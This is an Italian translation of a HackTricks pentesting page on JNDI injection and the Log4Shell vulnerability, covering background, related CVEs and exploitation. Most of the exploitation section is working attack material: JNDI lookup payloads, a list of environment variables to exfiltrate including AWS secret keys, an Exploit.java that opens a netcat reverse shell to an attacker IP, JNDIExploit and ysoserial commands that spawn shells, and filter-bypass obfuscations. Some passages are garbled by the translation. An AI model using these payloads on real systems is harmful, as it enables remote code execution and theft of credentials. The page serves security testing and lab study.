# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilit√† pi√π importanti in modo da poterle correggere pi√π velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi stesso.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Informazioni di base

JNDI, integrato in Java dalla fine degli anni '90, funge da servizio di directory, consentendo ai programmi Java di individuare dati o oggetti tramite un sistema di denominazione. Supporta vari servizi di directory tramite interfacce di provider di servizi (SPI), consentendo il recupero di dati da diversi sistemi, inclusi oggetti Java remoti. Gli SPI comuni includono CORBA COS, Java RMI Registry e LDAP.

### Riferimento di denominazione JNDI
Gli oggetti Java possono essere archiviati e recuperati utilizzando i riferimenti di denominazione JNDI, che si presentano in due forme:

- **Indirizzi di riferimento**: specifica la posizione di un oggetto (ad esempio, _rmi://server/ref_), consentendo il recupero diretto dall'indirizzo specificato.
- **Fabbrica remota**: fa riferimento a una classe di fabbrica remota. Quando viene accessata, la classe viene scaricata e istanziata dalla posizione remota.

Tuttavia, questo meccanismo pu√≤ essere sfruttato, portando potenzialmente al caricamento ed esecuzione di codice arbitrario. Come contromisura:

- **RMI**: `java.rmi.server.useCodeabseOnly = true` di default da JDK 7u21, limitando il caricamento di oggetti remoti. Un Security Manager limita ulteriormente ci√≤ che pu√≤ essere caricato.
- **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` di default da JDK 6u141, 7u131, 8u121, bloccando l'esecuzione di oggetti Java caricati da remoto. Se impostato su `true`, l'esecuzione di codice remoto √® possibile senza la supervisione di un Security Manager.
- **CORBA**: Non ha una propriet√† specifica, ma il Security Manager √® sempre attivo.

Tuttavia, il **Naming Manager**, responsabile della risoluzione dei collegamenti JNDI, non dispone di meccanismi di sicurezza integrati, consentendo potenzialmente il recupero di oggetti da qualsiasi origine. Ci√≤ rappresenta un rischio poich√© le protezioni RMI, LDAP e CORBA possono essere aggirate, portando al caricamento di oggetti Java arbitrari o allo sfruttamento di componenti di applicazioni esistenti (gadget) per eseguire codice dannoso.

Esempi di URL sfruttabili includono:
- _rmi://attacker-server/bar_
- _ldap://attacker-server/bar_
- _iiop://attacker-server/bar_

Nonostante le protezioni, rimangono vulnerabilit√†, principalmente a causa della mancanza di salvaguardie contro il caricamento di JNDI da fonti non attendibili e la possibilit√† di aggirare le protezioni esistenti.


### Esempio JNDI

![](<../../.gitbook/assets/image (655) (1) (1).png>)

Anche se hai impostato un **`PROVIDER_URL`**, puoi indicarne uno diverso in una ricerca e verr√† utilizzato: `ctx.lookup("<attacker-controlled-url>")` ed √® ci√≤ che un attaccante sfrutter√† per caricare oggetti arbitrari da un sistema controllato da lui.

### Panoramica di CORBA

CORBA (Common Object Request Broker Architecture) utilizza un **Interoperable Object Reference (IOR)** per identificare univocamente gli oggetti remoti. Questo riferimento include informazioni essenziali come:

- **ID tipo**: identificatore univoco per un'interfaccia.
- **Codebase**: URL per ottenere la classe stub.

√à importante notare che CORBA non √® intrinsecamente vulnerabile. Assicurare la sicurezza di solito comporta:

- Installazione di un **Security Manager**.
- Configurazione del Security Manager per consentire connessioni a codebase potenzialmente dannose. Ci√≤ pu√≤ essere ottenuto tramite:
- Autorizzazione del socket, ad esempio ````permissions java.net.SocketPermission "*:1098-1099", "connect";````.
- Autorizzazioni di lettura del file, universalmente (````permission java.io.FilePermission "<<ALL FILES>>", "read";````) o per directory specifiche in cui potrebbero essere posizionati file dannosi.

Tuttavia, alcune politiche dei fornitori potrebbero essere permissive e consentire queste connessioni per impostazione predefinita.

### Contesto RMI

Per RMI (Remote Method Invocation), la situazione √® leggermente diversa. Come per CORBA, il download arbitrario di classi √® limitato per impostazione predefinita. Per sfruttare RMI, di solito √® necessario aggirare il Security Manager, una sfida rilevante anche in CORBA.

### LDAP

Innanzitutto, dobbiamo distinguere tra una Ricerca e una Ricerca.\
Una **ricerca** utilizzer√† un URL come `ldap://localhost:389/o=JNDITutorial` per trovare l'oggetto JNDITutorial da un server LDAP e **recuperarne gli attributi**.\
Una **ricerca** √® destinata ai **servizi di denominazione** poich√© vogliamo ottenere **ci√≤ che √® associato a un nome**.

Se la ricerca LDAP √® stata invocata con **SearchControls.setReturningObjFlag() con `true`, l'oggetto restituito verr√† ricostruito**.

Pertanto, ci sono diversi modi per attaccare queste opzioni.\
Un **attaccante pu√≤ corrompere i record LDAP introducendo payload** su di essi che verranno eseguiti nei sistemi che li raccolgono (molto utile per **compromettere decine di macchine** se si ha accesso al server LDAP). Un altro modo per sfruttare ci√≤ sarebbe eseguire un **attacco MitM in una ricerca LDAP**, ad esempio.

Nel caso in cui sia possibile **far risolvere un'applicazione un URL LDAP JNDI**, √® possibile controllare l'LDAP che verr√† cercato e potresti inviare l'exploit (log4shell).

#### Exploit di deserializzazione

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

L'**exploit √® serializzato** e verr√† deserializzato.\
Nel caso in cui `trustURLCodebase` sia `true`, un attaccante pu√≤ fornire le proprie classi nella codebase, altrimenti dovr√† sfruttare gadget nel classpath.

#### Exploit di riferimento JNDI

√à pi√π facile attaccare questo LDAP utilizzando **riferimenti JavaFactory**:

![](<../../.gitbook/assets/image (660) (1) (1).png>)
## Vulnerabilit√† Log4Shell

La vulnerabilit√† √® introdotta in Log4j perch√© supporta una [**sintassi speciale**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) nella forma `${prefix:name}`, dove `prefix` √® uno dei diversi [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) in cui `name` dovrebbe essere valutato. Ad esempio, `${java:version}` √® la versione corrente di Java in esecuzione.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) ha introdotto una funzionalit√† di ricerca `jndi`. Questa funzionalit√† consente il recupero di variabili tramite JNDI. Di solito, la chiave √® automaticamente preceduta da `java:comp/env/`. Tuttavia, se la chiave stessa include un **":"**, questo prefisso predefinito non viene applicato.

Con un **":" presente** nella chiave, come in `${jndi:ldap://example.com/a}`, non c'√® **prefisso** e viene effettuata una **richiesta al server LDAP per l'oggetto**. E questi Lookups possono essere utilizzati sia nella configurazione di Log4j che durante la registrazione delle righe.

Pertanto, l'unica cosa necessaria per ottenere RCE √® una **versione vulnerabile di Log4j che elabora informazioni controllate dall'utente**. E poich√© questa √® una libreria ampiamente utilizzata dalle applicazioni Java per registrare informazioni (incluse le applicazioni esposte su Internet), era molto comune avere log4j che registrava ad esempio gli header HTTP ricevuti come l'User-Agent. Tuttavia, log4j **non viene utilizzato solo per registrare informazioni HTTP ma qualsiasi input** e dati indicati dallo sviluppatore.

## Panoramica delle CVE correlate a Log4Shell

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **[Critica]**
Questa vulnerabilit√† √® una grave **falla di deserializzazione non fidata** nel componente `log4j-core`, che interessa le versioni da 2.0-beta9 a 2.14.1. Consente l'esecuzione remota di codice (RCE), consentendo agli attaccanti di prendere il controllo dei sistemi. Il problema √® stato segnalato da Chen Zhaojun del team di sicurezza di Alibaba Cloud ed √® presente in vari framework Apache. La correzione iniziale nella versione 2.15.0 era incompleta. Sono disponibili regole Sigma per la difesa ([Regola 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml), [Regola 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **[Critica]**
Inizialmente classificata come bassa ma successivamente aggiornata a critica, questa CVE √® una falla di **Denial of Service (DoS)** risultante da una correzione incompleta nella versione 2.15.0 per CVE-2021-44228. Interessa configurazioni non predefinite, consentendo agli attaccanti di causare attacchi DoS attraverso payload manipolati. Un [tweet](https://twitter.com/marcioalm/status/1471740771581652995) mostra un metodo di bypass. Il problema √® risolto nelle versioni 2.16.0 e 2.12.2 rimuovendo i pattern di ricerca dei messaggi e disabilitando JNDI per impostazione predefinita.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **[Alta]**
Interessando le versioni **Log4j 1.x** in configurazioni non predefinite che utilizzano `JMSAppender`, questa CVE √® una falla di deserializzazione non fidata. Non √® disponibile alcuna correzione per il ramo 1.x, che √® fuori servizio, e si consiglia di eseguire l'aggiornamento a `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **[Moderata]**
Questa vulnerabilit√† interessa il framework di registrazione Logback, successore di Log4j 1.x. Inizialmente ritenuto sicuro, il framework √® stato trovato vulnerabile e sono state rilasciate nuove versioni (1.3.0-alpha11 e 1.2.9) per affrontare il problema.

### **CVE-2021-45105** **[Alta]**
Log4j 2.16.0 contiene una falla DoS, che ha portato al rilascio di `log4j 2.17.0` per correggere la CVE. Ulteriori dettagli sono disponibili nel rapporto di BleepingComputer [report](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)
Interessando la versione 2.17 di log4j, questa CVE richiede all'attaccante di controllare il file di configurazione di log4j. Coinvolge una possibile esecuzione arbitraria di codice tramite un JDBCAppender configurato. Ulteriori dettagli sono disponibili nel post del blog di [Checkmarx](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).


## Sfruttamento di Log4Shell

### Scoperta

Questa vulnerabilit√† √® molto facile da scoprire se non protetta perch√© invier√† almeno una **richiesta DNS** all'indirizzo indicato nel payload. Pertanto, i payload come:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (utilizzando [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (utilizzando [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (utilizzando Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (utilizzando [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (utilizzando [huntress](https://log4shell.huntress.com))

Si noti che **anche se viene ricevuta una richiesta DNS, ci√≤ non significa che l'applicazione sia sfruttabile** (o anche vulnerabile), sar√† necessario provare a sfruttarla.

{% hint style="info" %}
Ricorda che per **sfruttare la versione 2.15** √® necessario aggiungere il **bypass del controllo di localhost**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Scoperta locale**

Cerca **versioni locali vulnerabili** della libreria con:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verifica**

Alcune delle piattaforme elencate in precedenza ti consentiranno di inserire dei dati variabili che verranno registrati quando vengono richiesti.\
Ci√≤ pu√≤ essere molto utile per 2 cose:

* Per **verificare** la vulnerabilit√†
* Per **esfiltrare informazioni** sfruttando la vulnerabilit√†

Ad esempio, potresti richiedere qualcosa come:\
o come `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** e se viene ricevuta una **richiesta DNS con il valore della variabile di ambiente**, sai che l'applicazione √® vulnerabile.

Altre informazioni che potresti provare a **esfiltrare**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### Informazioni RCE

{% hint style="info" %}
Gli host che utilizzano versioni JDK superiori a 6u141, 7u131 o 8u121 sono protetti dal vettore di attacco di caricamento della classe LDAP. Ci√≤ √® dovuto alla disattivazione predefinita di `com.sun.jndi.ldap.object.trustURLCodebase`, che impedisce a JNDI di caricare una codebase remota tramite LDAP. Tuttavia, √® importante notare che queste versioni **non sono protette dal vettore di attacco di deserializzazione**.

Per gli attaccanti che mirano a sfruttare queste versioni JDK pi√π recenti, √® necessario sfruttare un **gadget fidato** all'interno dell'applicazione Java. Strumenti come ysoserial o JNDIExploit vengono spesso utilizzati a questo scopo. Al contrario, sfruttare versioni JDK inferiori √® relativamente pi√π semplice poich√© queste versioni possono essere manipolate per caricare ed eseguire classi arbitrarie.

Per **ulteriori informazioni** (_come le limitazioni sui vettori RMI e CORBA_) **consultare la sezione precedente del riferimento JNDI Naming** o [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec con payload personalizzato

Puoi testare questo nella **THM box:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

Utilizza lo strumento [**marshalsec**](https://github.com/mbechler/marshalsec) (versione jar disponibile [**qui**](https://github.com/RandomRobbieBF/marshalsec-jar)). Questo approccio stabilisce un server di riferimento LDAP per reindirizzare le connessioni a un server HTTP secondario dove sar√† ospitato lo sfruttamento:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Per indurre il bersaglio a caricare un codice di shell inversa, crea un file Java chiamato `Exploit.java` con il seguente contenuto:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Compila il file Java in un file di classe usando: `javac Exploit.java -source 8 -target 8`. Successivamente, avvia un **server HTTP** nella directory contenente il file di classe con: `python3 -m http.server`. Assicurati che il **server LDAP marshalsec** faccia riferimento a questo server HTTP.

Scatena l'esecuzione della classe di exploit sul server web suscettibile inviando un payload simile a:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Nota:** Questo exploit si basa sulla configurazione di Java per consentire il caricamento remoto del codice tramite LDAP. Se ci√≤ non √® consentito, considera l'exploit di una classe fidata per l'esecuzione di codice arbitrario.


### RCE - **JNDIExploit**

{% hint style="info" %}
Nota che per qualche motivo l'autore ha rimosso questo progetto da GitHub dopo la scoperta di log4shell. Puoi trovare una versione in cache su [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2), ma se vuoi rispettare la decisione dell'autore, utilizza un metodo diverso per sfruttare questa vulnerabilit√†.

Inoltre, non puoi trovare il codice sorgente nel wayback machine, quindi analizza il codice sorgente o esegui il file jar sapendo che non sai cosa stai eseguendo.
{% endhint %}

Per questo esempio, puoi semplicemente eseguire questo **server web vulnerabile a log4shell** sulla porta 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_nel README troverai come eseguirlo_). Questa app vulnerabile registra con una versione vulnerabile di log4shell il contenuto dell'intestazione della richiesta HTTP _X-Api-Version_.

Successivamente, puoi scaricare il file jar di **JNDIExploit** ed eseguirlo con:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Dopo aver letto il codice solo un paio di minuti, in _com.feihong.ldap.LdapServer_ e _com.feihong.ldap.HTTPServer_ puoi vedere come vengono creati i **server LDAP e HTTP**. Il server LDAP capir√† quale payload deve essere servito e reindirizzer√† la vittima al server HTTP, che eseguir√† l'exploit.\
In _com.feihong.ldap.gadgets_ puoi trovare **alcuni gadget specifici** che possono essere utilizzati per eseguire l'azione desiderata (potenzialmente eseguire codice arbitrario). E in _com.feihong.ldap.template_ puoi vedere le diverse classi di template che **genereranno gli exploit**.

Puoi vedere tutti gli exploit disponibili con **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Alcuni utili sono:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Quindi, nel nostro esempio, abbiamo gi√† l'applicazione Docker vulnerabile in esecuzione. Per attaccarla:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Quando invii gli attacchi, vedrai alcuni output nel terminale in cui hai eseguito **JNDIExploit-1.2-SNAPSHOT.jar**.

**Ricorda di controllare `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` per altre opzioni di sfruttamento. Inoltre, nel caso ne avessi bisogno, puoi cambiare la porta dei server LDAP e HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

In modo simile all'exploit precedente, puoi provare a utilizzare [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) per sfruttare questa vulnerabilit√†.\
Puoi generare gli URL da inviare alla vittima eseguendo:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Questo attacco utilizzando un oggetto Java generato su misura funzioner√† nei laboratori come la **stanza solare THM**. Tuttavia, in generale non funzioner√† (poich√© di default Java non √® configurato per caricare il codice remoto utilizzando LDAP), penso perch√© non sfrutta una classe fidata per eseguire codice arbitrario._

### RCE - ysoserial & JNDI-Exploit-Kit

Questa opzione √® molto utile per attaccare **versioni di Java configurate per fidarsi solo di classi specificate e non di tutti**. Pertanto, **ysoserial** verr√† utilizzato per generare **serializzazioni di classi fidate** che possono essere utilizzate come gadget per **eseguire codice arbitrario** (_la classe fidata abusata da ysoserial deve essere utilizzata dal programma Java vittima affinch√© l'exploit funzioni_).

Utilizzando **ysoserial** o [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) √® possibile creare l'exploit di deserializzazione che verr√† scaricato da JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Utilizza [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) per generare **collegamenti JNDI** in cui l'exploit sar√† in attesa di connessioni dalle macchine vulnerabili. Puoi servire **diversi exploit che possono essere generati automaticamente** da JNDI-Exploit-Kit o anche i **tuoi payload di deserializzazione** (generati da te o da ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Ora puoi facilmente utilizzare un link JNDI generato per sfruttare la vulnerabilit√† e ottenere una **reverse shell** inviando a una versione vulnerabile di log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Bypasses
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ƒ±}}:ldap://...} //Notice the unicode "i"
```
### Scanner Automatici

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Trova librerie locali vulnerabili

### Laboratori per testare

* [**Macchina HTB LogForge**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Post-Esploito Log4Shell

In questo [**CTF writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) √® ben spiegato come sia potenzialmente **possibile** **abusare** alcune funzionalit√† di **Log4J**.

La [**pagina di sicurezza**](https://logging.apache.org/log4j/2.x/security.html) di Log4j contiene alcune frasi interessanti:

> Dalla versione 2.16.0 (per Java 8), la funzionalit√† di **ricerca dei messaggi √® stata completamente rimossa**. **Le ricerche nella configurazione continuano a funzionare**. Inoltre, Log4j disabilita l'accesso a JNDI per impostazione predefinita. Le ricerche JNDI nella configurazione devono ora essere abilitate esplicitamente.

> Dalla versione 2.17.0 (e 2.12.3 e 2.3.1 per Java 7 e Java 6), **solo le stringhe di ricerca nella configurazione vengono espandate in modo ricorsivo**; in qualsiasi altro utilizzo, viene risolta solo la ricerca di primo livello e le ricerche nidificate non vengono risolte.

Ci√≤ significa che per impostazione predefinita non √® possibile **utilizzare alcuna vulnerabilit√† `jndi`**. Inoltre, per eseguire **ricerche ricorsive**, √® necessario averle configurate.

Ad esempio, in quel CTF ci√≤ era configurato nel file log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Ricerche Env

In [questo CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) l'attaccante controllava il valore di `${sys:cmd}` e doveva esfiltrare la flag da una variabile d'ambiente.\
Come visto in questa pagina nei [**payload precedenti**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), ci sono diversi modi per accedere alle variabili d'ambiente, come ad esempio: **`${env:FLAG}`**. In questo CTF non √® stato utile, ma potrebbe esserlo in altri scenari reali.

### Esfiltrazione tramite Eccezioni

Nel CTF, non si poteva accedere a stderr dell'applicazione Java utilizzando log4J, ma le eccezioni di Log4J vengono inviate a stdout, che viene stampato nell'applicazione Python. Ci√≤ significa che, scatenando un'eccezione, potevamo accedere al contenuto. Un'eccezione per esfiltrare la flag era: **`${java:${env:FLAG}}`.** Questo funziona perch√© **`${java:CTF{blahblah}}`** non esiste e verr√† mostrata un'eccezione con il valore della flag:

![](<../../.gitbook/assets/image (157).png>)

### Eccezioni tramite Conversion Patterns

Solo per menzionarlo, √® anche possibile iniettare nuovi [**conversion patterns**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) e scatenare eccezioni che verranno registrate su `stdout`. Ad esempio:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Questo non √® stato utile per esfiltrare dati all'interno del messaggio di errore, perch√© la ricerca non √® stata risolta prima del conversion pattern, ma potrebbe essere utile per altre cose come il rilevamento.

### Conversion Patterns Regexes

Tuttavia, √® possibile utilizzare alcuni **conversion patterns che supportano le regex** per esfiltrare informazioni da una ricerca utilizzando le regex e sfruttando comportamenti **di ricerca binaria** o **basati sul tempo**.

* **Ricerca binaria tramite messaggi di eccezione**

Il conversion pattern **`%replace`** pu√≤ essere utilizzato per **sostituire** il **contenuto** di una **stringa** anche utilizzando **regex**. Funziona cos√¨: `replace{pattern}{regex}{sostituzione}`\
Sfruttando questo comportamento, √® possibile fare in modo che la sostituzione **scateni un'eccezione se la regex trova una corrispondenza** all'interno della stringa (e nessuna eccezione se non viene trovata) come segue:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Basato sul tempo**

Come √® stato menzionato nella sezione precedente, **`%replace`** supporta le **espressioni regolari**. Quindi √® possibile utilizzare un payload dalla pagina [**ReDoS**](../regular-expression-denial-of-service-redos.md) per causare un **timeout** nel caso in cui venga trovata la flag.\
Ad esempio, un payload come `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` provocherebbe un **timeout** in quel CTF.

In questo [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), invece di utilizzare un attacco ReDoS, √® stato utilizzato un **attacco di amplificazione** per causare una differenza di tempo nella risposta:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Se la flag inizia con `flagGuess`, l'intera flag viene sostituita con 29 `#` (ho utilizzato questo carattere perch√© probabilmente non fa parte della flag). **Ciascuno dei 29 `#` risultanti viene quindi sostituito con 54 `#`**. Questo processo viene ripetuto **6 volte**, portando a un totale di ` 29*54*54^6* =`` `` `**`96816014208`  `#`!**
>
> Sostituire cos√¨ tanti `#` provocher√† il timeout di 10 secondi dell'applicazione Flask, che a sua volta comporter√† l'invio del codice di stato HTTP 500 all'utente. (Se la flag non inizia con `flagGuess`, riceveremo un codice di stato non 500)

## Riferimenti

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
